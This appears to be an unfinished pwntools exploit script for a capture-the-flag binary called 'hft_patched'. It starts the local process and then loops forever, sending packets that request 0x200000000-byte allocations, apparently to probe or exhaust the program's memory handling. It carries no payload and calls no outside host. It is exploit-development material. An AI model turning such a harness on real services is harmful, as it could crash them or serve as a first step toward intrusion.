#!/usr/bin/env python3

from pwn import *
from tqdm import tqdm

context.terminal = ["tmux", "splitw", "-h"]
context.log_level='debug'
exe = ELF("./hft_patched")
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-2.35.so", checksec=False)

context.binary = exe

gdbscript = [
    "b main.c:53"
]


def conn():
    r = process([exe.path])
    if args.GDB:
        gdb.attach(r, gdbscript="\n".join(gdbscript))
    print('pid',r.pid)
    __import__('time').sleep(5)
    return r

PKT_OPT_ECHO = 1
r=None
def alloc(sz,contents):
    r.send(pack(sz))
    r.send(p64(PKT_OPT_ECHO))
    r.sendline(contents)
    r.recvline(); r.recvline()

def main():
    global r
    r = conn()
    #pbar=tqdm()
    r.recvline()
    r.recvline()

    while True: 
        #alloc(0x100000,b'A')
        alloc(0x200000000,b'A')
        #pbar.update(1)

    r.interactive()


if __name__ == "__main__":
    main()
